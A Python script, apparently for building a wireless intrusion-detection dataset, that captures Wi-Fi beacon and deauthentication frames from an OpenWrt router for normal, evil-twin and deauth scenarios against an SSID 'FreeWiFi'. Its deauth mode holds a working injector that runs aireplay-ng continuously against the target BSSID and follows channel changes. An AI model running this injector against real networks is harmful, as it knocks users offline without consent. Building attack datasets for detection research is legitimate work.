#!/usr/bin/env python3
import threading
import subprocess
import tempfile
import time
import os
from datetime import datetime
from scapy.all import Dot11, Dot11Elt, PcapReader, PcapWriter
from colorama import Fore, Style, init

init(autoreset=True)

# CONFIGURATION
OPENWRT_IP       = "192.168.32.55"
TARGET_SSID      = "FreeWiFi"
IFACE_24         = "phy0-mon0"
IFACE_50         = "phy1-mon0"
LOCAL_MON_IFACE  = "wlan0mon"          # TL-WN722N in monitor mode
DEAUTH_BURST     = 20                  # frames per aireplay-ng burst
TRACKER_INTERVAL = 2                   # seconds between channel-sync polls
OUTPUT_DIR_NOR   = "../data/raw/normal"
OUTPUT_DIR_ATT   = "../data/raw/attack/eviltwin"
OUTPUT_DIR_DEAUTH = "../data/raw/attack/deauth"

# Paused by deauth mode so it does not fight the local channel tracker
hopper_paused = threading.Event()


# HARDWARE SETUP  (OpenWrt monitor interfaces)
def setup_hardware():
    print(f"{Fore.CYAN}[*] Configuring Dual Monitoring (phy0 & phy1)...{Style.RESET_ALL}")
    cmd = f"""
    /etc/init.d/network stop;
    uci delete wireless.mon24 2>/dev/null;
    uci set wireless.mon24=wifi-iface; uci set wireless.mon24.device='radio0';
    uci set wireless.mon24.mode='monitor'; uci set wireless.mon24.ifname='{IFACE_24}';
    uci delete wireless.mon50 2>/dev/null;
    uci set wireless.mon50=wifi-iface; uci set wireless.mon50.device='radio1';
    uci set wireless.mon50.mode='monitor'; uci set wireless.mon50.ifname='{IFACE_50}';
    uci commit wireless; /etc/init.d/network start; sleep 5;
    ifconfig {IFACE_24} up; ifconfig {IFACE_50} up;
    """
    subprocess.run(['ssh', f'root@{OPENWRT_IP}', cmd], check=True, stderr=subprocess.DEVNULL)


# CHANNEL HOPPER  (normal / evil-twin modes only)
def channel_hopper():
    ch_24 = [1, 6, 11]
    ch_50 = [36, 44, 149, 157]
    while True:
        if hopper_paused.is_set():
            time.sleep(1)
            continue
        for i in range(max(len(ch_24), len(ch_50))):
            if hopper_paused.is_set():
                break
            c24 = ch_24[i % len(ch_24)]
            c50 = ch_50[i % len(ch_50)]
            subprocess.run(
                ['ssh', f'root@{OPENWRT_IP}', f'iw dev {IFACE_24} set channel {c24}'],
                stderr=subprocess.DEVNULL)
            subprocess.run(
                ['ssh', f'root@{OPENWRT_IP}', f'iw dev {IFACE_50} set channel {c50}'],
                stderr=subprocess.DEVNULL)
            time.sleep(4)


# FREEWIFI DETECTION  (normal / evil-twin pre-scan)
def detect_freewifi_on_iface(iface, band_label, timeout=30):
    print(f"{Fore.CYAN}[*] Pre-scan: looking for '{TARGET_SSID}' on {band_label} ({iface})...{Style.RESET_ALL}")
    cmd = ['ssh', f'root@{OPENWRT_IP}',
           'tcpdump', '-i', iface, '-y', 'IEEE802_11_RADIO',
           '-l', '-U', '-w', '-', 'type mgt subtype beacon']
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    timer = threading.Timer(timeout, proc.kill)
    timer.start()
    detected, bssid_found = False, None
    try:
        reader = PcapReader(proc.stdout)
        for pkt in reader:
            if not pkt.haslayer(Dot11Elt):
                continue
            try:
                ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore').strip()
                if ssid == TARGET_SSID:
                    bssid_found = pkt.addr3
                    detected = True
                    proc.kill()
                    break
            except Exception:
                continue
    except Exception:
        pass
    finally:
        timer.cancel()
        proc.kill()
    return detected, bssid_found


def detect_freewifi():
    results = {}

    def scan(iface, label):
        results[label] = detect_freewifi_on_iface(iface, label)

    threads = [
        threading.Thread(target=scan, args=(IFACE_24, "2.4GHz")),
        threading.Thread(target=scan, args=(IFACE_50, "5GHz")),
    ]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    detected_any = False
    for label, (det, bssid) in results.items():
        if det:
            print(f"{Fore.GREEN}[+] '{TARGET_SSID}' DETECTED on {label}: BSSID={bssid}{Style.RESET_ALL}")
            detected_any = True
        else:
            print(f"{Fore.YELLOW}[-] '{TARGET_SSID}' NOT found on {label} during pre-scan{Style.RESET_ALL}")
    return detected_any


# DEAUTH — device connection check
def check_deauth_devices():
    """Verify wlan0mon (TL-WN722N) and OpenWrt phy0-mon0 are ready."""
    ok = True

    # 1. Local monitor interface
    r = subprocess.run(['iwconfig', LOCAL_MON_IFACE],
                       capture_output=True, text=True)
    if 'Monitor' in r.stdout:
        print(f"{Fore.GREEN}[+] {LOCAL_MON_IFACE} — Monitor mode OK{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[!] {LOCAL_MON_IFACE} not in monitor mode.{Style.RESET_ALL}")
        print(f"    Run: sudo airmon-ng start wlx18a6f7110f62")
        ok = False

    # 2. OpenWrt SSH reachability
    r = subprocess.run(
        ['ssh', '-o', 'ConnectTimeout=5', '-o', 'BatchMode=yes',
         f'root@{OPENWRT_IP}', 'echo ok'],
        capture_output=True, text=True)
    if r.stdout.strip() == 'ok':
        print(f"{Fore.GREEN}[+] OpenWrt {OPENWRT_IP} — SSH OK{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[!] Cannot reach OpenWrt at {OPENWRT_IP} via SSH.{Style.RESET_ALL}")
        ok = False

    # 3. phy0-mon0 up on OpenWrt
    if ok:
        r = subprocess.run(
            ['ssh', f'root@{OPENWRT_IP}',
             f'ip link show {IFACE_24} 2>/dev/null | grep -c UP'],
            capture_output=True, text=True)
        if r.stdout.strip() != '0':
            print(f"{Fore.GREEN}[+] OpenWrt {IFACE_24} — UP OK{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[!] {IFACE_24} is not UP on OpenWrt.{Style.RESET_ALL}")
            ok = False

    return ok


# DEAUTH — locate FreeWiFi AP via local airodump-ng scan
def find_ap_bssid(timeout=20):
    """
    Scan wlan0mon for FreeWiFi across all channels.
    Runs airodump-ng for `timeout` seconds, reads the CSV once after it stops.
    Returns (bssid, channel) or (None, None).
    """
    print(f"{Fore.CYAN}[*] Scanning for '{TARGET_SSID}' on {LOCAL_MON_IFACE} ({timeout}s)...{Style.RESET_ALL}")

    with tempfile.TemporaryDirectory() as tmpdir:
        csv_base = os.path.join(tmpdir, 'scan')

        proc = subprocess.Popen(
            ['airodump-ng', '--output-format', 'csv', '--write', csv_base, LOCAL_MON_IFACE],
            stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)

        # Countdown while airodump-ng scans
        for remaining in range(timeout, 0, -1):
            print(f"\r  {remaining:>2}s remaining...", end="", flush=True)
            time.sleep(1)
            if proc.poll() is not None:
                # airodump-ng exited early — likely a flag/permission error
                break

        proc.kill()
        try:
            _, stderr_out = proc.communicate(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()
            stderr_out = b''
            try:
                proc.communicate(timeout=2)
            except subprocess.TimeoutExpired:
                pass
        print()  # newline after countdown

        # If process died before we killed it, show why
        if proc.returncode not in (None, -9, -15, 0):
            err = stderr_out.decode(errors='ignore').strip()
            if err:
                print(f"{Fore.RED}[!] airodump-ng error: {err[:200]}{Style.RESET_ALL}")

        csv_file = f"{csv_base}-01.csv"
        if not os.path.exists(csv_file):
            print(f"{Fore.RED}[!] No scan output — airodump-ng may have failed.{Style.RESET_ALL}")
            print(f"    Verify manually: sudo airodump-ng {LOCAL_MON_IFACE}")
            return None, None

        # Parse AP section of CSV (ends before "Station MAC" line)
        bssid, channel = None, None
        found_ssids = []
        try:
            with open(csv_file, 'r', errors='ignore') as f:
                for line in f:
                    if line.strip().startswith('Station MAC'):
                        break
                    parts = [p.strip() for p in line.split(',')]
                    if len(parts) < 14:
                        continue
                    ssid = parts[13]
                    if ssid and ssid != 'ESSID':
                        found_ssids.append(ssid)
                    if ssid == TARGET_SSID:
                        b = parts[0].strip()
                        c = parts[3].strip()
                        if b and c.lstrip('-').isdigit():
                            bssid, channel = b, c
                            break
        except Exception:
            pass

        if not bssid:
            if found_ssids:
                print(f"{Fore.YELLOW}[~] APs found: {', '.join(dict.fromkeys(found_ssids))}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}    '{TARGET_SSID}' not among them — check hotspot name or TARGET_SSID in config.{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}[~] No APs detected — ensure hotspot is broadcasting and wlan0mon is up.{Style.RESET_ALL}")

        return bssid, channel


# DEAUTH — continuous injector with dynamic channel tracking
def deauth_injector_worker(bssid, duration, stop_event):
    """
    Run aireplay-ng in continuous mode (-0 0) for full throughput.
    Polls airodump-ng CSV every TRACKER_INTERVAL seconds; on channel change,
    kills aireplay-ng, syncs both interfaces, restarts injection.
    """
    def sync_channel(ch):
        subprocess.run(['iw', 'dev', LOCAL_MON_IFACE, 'set', 'channel', ch],
                       stderr=subprocess.DEVNULL)
        subprocess.run(['ssh', '-o', 'ConnectTimeout=3', '-o', 'BatchMode=yes',
                        f'root@{OPENWRT_IP}', f'iw dev {IFACE_24} set channel {ch}'],
                       stderr=subprocess.DEVNULL)

    def start_inject():
        return subprocess.Popen(
            ['aireplay-ng', '-0', '0', '-a', bssid, LOCAL_MON_IFACE],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    with tempfile.TemporaryDirectory() as tmpdir:
        csv_base = os.path.join(tmpdir, 'track')
        track_proc = subprocess.Popen(
            ['airodump-ng', '--bssid', bssid, '--output-format', 'csv',
             '--write', csv_base, LOCAL_MON_IFACE],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)  # let first CSV row appear

        last_ch = None
        inject_proc = None
        end_time = time.time() + duration
        tick = 0

        while not stop_event.is_set() and time.time() < end_time:
            # Read current AP channel from CSV
            csv_file = f"{csv_base}-01.csv"
            cur_ch = None
            if os.path.exists(csv_file):
                try:
                    with open(csv_file, 'r', errors='ignore') as f:
                        for line in f:
                            if bssid.lower() in line.lower():
                                parts = [p.strip() for p in line.split(',')]
                                if len(parts) >= 4 and parts[3].strip().lstrip('-').isdigit():
                                    cur_ch = parts[3].strip()
                                    break
                except Exception:
                    pass

            if cur_ch and cur_ch != last_ch:
                # Stop current injection, sync channel, restart
                if inject_proc and inject_proc.poll() is None:
                    inject_proc.kill()
                    inject_proc.wait()
                sync_channel(cur_ch)
                if last_ch:
                    print(f"\n{Fore.YELLOW}[~] AP channel: {last_ch} → {cur_ch} — synced{Style.RESET_ALL}")
                last_ch = cur_ch
                inject_proc = start_inject()
                print(f"\r{Fore.RED}[>] Injecting  │ ch {last_ch:<3} │ BSSID {bssid}{Style.RESET_ALL}",
                      end="", flush=True)
            elif inject_proc is None or inject_proc.poll() is not None:
                # (Re)start if not running yet or died
                if last_ch:
                    inject_proc = start_inject()

            tick += 1
            time.sleep(TRACKER_INTERVAL)

        # Stop injection
        if inject_proc and inject_proc.poll() is None:
            inject_proc.kill()
            inject_proc.wait()
        print()
        track_proc.kill()
        track_proc.wait()


# SNIFFER — FreeWiFi beacons, saves to PCAP
def sniffer_worker(iface, band_label, duration, output_dir):
    os.makedirs(output_dir, exist_ok=True)
    timestamp  = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_band  = band_label.replace(".", "_").replace(" ", "_")
    pcap_path  = os.path.join(output_dir, f"FreeWiFi_{safe_band}_{timestamp}.pcap")
    pcap_writer = PcapWriter(pcap_path, append=False, sync=True)
    print(f"{Fore.GREEN}[+] [{band_label}] Saving to → {pcap_path}{Style.RESET_ALL}")

    cmd = ['ssh', f'root@{OPENWRT_IP}',
           'tcpdump', '-i', iface, '-y', 'IEEE802_11_RADIO',
           '-l', '-U', '-w', '-', 'type mgt subtype beacon']
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    timer = threading.Timer(duration, proc.kill)
    timer.start()

    pkt_count = 0
    try:
        reader = PcapReader(proc.stdout)
        for pkt in reader:
            if not pkt.haslayer(Dot11Elt):
                continue
            try:
                ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore').strip()
                if ssid != TARGET_SSID:
                    continue
                pcap_writer.write(pkt)
                pkt_count += 1
            except Exception:
                continue
    except Exception:
        pass
    finally:
        timer.cancel()
        proc.kill()

    size_kb = os.path.getsize(pcap_path) // 1024
    print(f"{Fore.GREEN}[+] [{band_label}] Done — {pkt_count} packets  |  {pcap_path}  ({size_kb} KB){Style.RESET_ALL}")


# DEAUTH SNIFFER — captures deauth frames on OpenWrt, saves to PCAP
def deauth_sniffer_worker(iface, band_label, duration, output_dir):
    os.makedirs(output_dir, exist_ok=True)
    timestamp  = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_band  = band_label.replace(".", "_").replace(" ", "_")
    pcap_path  = os.path.join(output_dir, f"Deauth_{safe_band}_{timestamp}.pcap")
    pcap_writer = PcapWriter(pcap_path, append=False, sync=True)
    print(f"{Fore.RED}[+] [{band_label}] Deauth capture → {pcap_path}{Style.RESET_ALL}")

    cmd = ['ssh', f'root@{OPENWRT_IP}',
           'tcpdump', '-i', iface, '-y', 'IEEE802_11_RADIO',
           '-l', '-U', '-w', '-', 'type mgt subtype deauth']
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    timer = threading.Timer(duration, proc.kill)
    timer.start()

    pkt_count = 0
    try:
        reader = PcapReader(proc.stdout)
        for pkt in reader:
            if not pkt.haslayer(Dot11):
                continue
            pcap_writer.write(pkt)
            pkt_count += 1
    except Exception:
        pass
    finally:
        timer.cancel()
        proc.kill()

    size_kb = os.path.getsize(pcap_path) // 1024
    print(f"{Fore.RED}[+] [{band_label}] Done — {pkt_count} deauth frames  |  {pcap_path}  ({size_kb} KB){Style.RESET_ALL}")


# ENTRY POINT
if __name__ == '__main__':
    setup_hardware()

    threading.Thread(target=channel_hopper, daemon=True).start()
    print(f"{Fore.CYAN}[*] Channel hopper started — waiting 5s for interfaces to settle...{Style.RESET_ALL}")
    time.sleep(5)

    capture_num = 0

    while True:
        capture_num += 1
        print(f"\n{Fore.YELLOW}--- Capture #{capture_num} ---{Style.RESET_ALL}")

        # --- Capture type ---
        print("  Capture type:")
        print("    [1] Normal traffic    →  ../data/raw/normal")
        print("    [2] Evil Twin attack  →  ../data/raw/attack")
        print("    [3] Deauth attack     →  ../data/raw/attack/deauth")
        ctype = input("  Choose [1/2/3, default 1]: ").strip()

        if ctype == "2":
            output_dir = OUTPUT_DIR_ATT
            type_label = "EVIL-TWIN ATTACK"
            type_color = Fore.RED
        elif ctype == "3":
            output_dir = OUTPUT_DIR_DEAUTH
            type_label = "DEAUTH ATTACK"
            type_color = Fore.YELLOW
        else:
            output_dir = OUTPUT_DIR_NOR
            type_label = "NORMAL"
            type_color = Fore.GREEN
        print(f"  {type_color}[{type_label}] Output → {output_dir}{Style.RESET_ALL}")

        # --- Duration ---
        raw = input("  Duration in seconds [default 300]: ").strip()
        try:
            duration = int(raw) if raw else 300
        except ValueError:
            print(f"{Fore.RED}  Invalid — using 300s.{Style.RESET_ALL}")
            duration = 300

        # DEAUTH MODE — self-contained: check devices → find AP → inject + capture
        if ctype == "3":
            hopper_paused.set()

            # 1. Check device connections
            print(f"\n{Fore.CYAN}[*] Checking device connections...{Style.RESET_ALL}")
            if not check_deauth_devices():
                print(f"{Fore.RED}[!] Device check failed. Fix above errors and retry.{Style.RESET_ALL}")
                hopper_paused.clear()
                continue

            # 2. Locate FreeWiFi AP
            bssid, channel = find_ap_bssid(timeout=20)
            if not bssid:
                print(f"{Fore.RED}[!] '{TARGET_SSID}' not found. Ensure hotspot is ON and retry.{Style.RESET_ALL}")
                hopper_paused.clear()
                continue
            print(f"{Fore.GREEN}[+] Found '{TARGET_SSID}' — BSSID: {bssid}  CH: {channel}{Style.RESET_ALL}")

            try:
                input(f"\n  Press Enter to start {duration}s [DEAUTH ATTACK] capture + injection...")
            except EOFError:
                print(f"\n  [auto-continue — stdin not a TTY]")

            stop_event = threading.Event()

            # 3. Start OpenWrt capture threads
            t24 = threading.Thread(
                target=deauth_sniffer_worker,
                args=(IFACE_24, "2.4GHz", duration, output_dir))
            t50 = threading.Thread(
                target=deauth_sniffer_worker,
                args=(IFACE_50, "5GHz", duration, output_dir))

            # 4. Start local deauth injector
            t_inj = threading.Thread(
                target=deauth_injector_worker,
                args=(bssid, duration, stop_event),
                daemon=True)

            t24.start()
            t50.start()
            t_inj.start()

            try:
                for remaining in range(duration, 0, -1):
                    time.sleep(1)
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[*] Capture interrupted by user.{Style.RESET_ALL}")

            stop_event.set()
            t24.join()
            t50.join()
            hopper_paused.clear()

        # NORMAL / EVIL-TWIN MODE
        else:
            if not detect_freewifi():
                print(f"{Fore.RED}[!] '{TARGET_SSID}' not detected on any band. Aborting.{Style.RESET_ALL}")
                raise SystemExit(1)

            try:
                input(f"\n  Press Enter to start {duration}s [{type_label}] capture...")
            except EOFError:
                print(f"\n  [auto-continue — stdin not a TTY]")

            t24 = threading.Thread(target=sniffer_worker, args=(IFACE_24, "2.4GHz", duration, output_dir))
            t50 = threading.Thread(target=sniffer_worker, args=(IFACE_50, "5GHz",   duration, output_dir))
            t24.start()
            t50.start()

            try:
                for remaining in range(duration, 0, -1):
                    print(f"\r  Capturing... {remaining:>4}s remaining", end="", flush=True)
                    time.sleep(1)
                print()
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[*] Capture interrupted by user.{Style.RESET_ALL}")

            t24.join()
            t50.join()

        # --- Another capture? ---
        try:
            again = input("\n  Collect another capture? [Y/n]: ").strip().lower()
        except EOFError:
            again = "n"
        if again == "n":
            break

    print(f"\n{Fore.GREEN}[*] Done. Files saved to {OUTPUT_DIR_NOR}, {OUTPUT_DIR_ATT}, and/or {OUTPUT_DIR_DEAUTH}{Style.RESET_ALL}")

